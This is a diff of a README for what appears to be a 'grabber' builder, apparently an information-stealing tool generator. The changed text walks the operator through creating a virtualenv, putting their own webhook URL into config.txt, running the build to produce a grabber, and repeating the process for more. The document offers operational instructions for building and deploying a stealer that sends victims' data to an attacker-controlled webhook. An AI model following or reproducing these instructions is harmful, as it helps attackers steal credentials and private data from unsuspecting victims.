@@ -1,4 +1,4 @@
-Make sure that internet is connected!
+Make sure that internet is connected when running for the first time in virtual env to install dependencies!
 
 How to use:-
 
@@ -7,7 +7,11 @@ How to use:-
 3) Open cmd in current dir and type "virtualenv env" and let it complete and close cmd.
 4) Open "config.txt" in "Data" folder and replace "WEBHOOK_URL" with your webhook.
 5) Copy all the files from "Data" folder to "Scripts" folder in "env" folder. (Do NOT copy the folder itself)
-6) Open cmd in the "Scripts" folder and type "run" and wait for it to complete.
+6) Type "run" in the address bar of the "Scripts" folder and wait for the process to complete.
 7) When the process complete, a new folder will open containing the grabber.
 
-SPECIAL NOTE ::::::::: DO NOT EDIT ANYTHING BESIDE "config.txt" OTHERWISE THE PROGRAM WILL NOT WORK!!!! YOU CAN SEE THE CODE BUT DON'T EDIT!!!
+How to create another grabber in the same virtual env:-
+
+- Edit the "config.txt" file in the "Scripts" folder and follow from the step (6).
+
+SPECIAL NOTE ::::::::: DO NOT EDIT ANYTHING BESIDES "config.txt" OTHERWISE THE PROGRAM WILL NOT WORK!!!! YOU CAN SEE THE CODE BUT DON'T EDIT!!!
